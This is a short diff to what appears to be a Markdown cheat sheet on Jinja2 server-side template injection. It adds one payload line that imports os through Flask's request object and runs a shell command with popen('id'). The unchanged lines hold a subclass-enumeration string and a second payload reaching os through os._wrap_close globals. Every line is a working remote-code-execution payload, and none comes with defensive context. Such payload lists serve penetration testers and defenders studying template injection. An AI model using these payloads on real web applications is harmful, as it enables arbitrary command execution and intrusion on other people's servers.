@@ -3,6 +3,7 @@
 - **Using os.wrap_close**
   ```
   {{'_'.__class__.__base__.__subclasses__()}}
+  {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
   {{'_'.__class__.__base__.__subclasses__()[<OS._WRAP_CLOSE>].__init__.__globals__['sys'].modules['os'].popen('id').read()}}
   ```
 
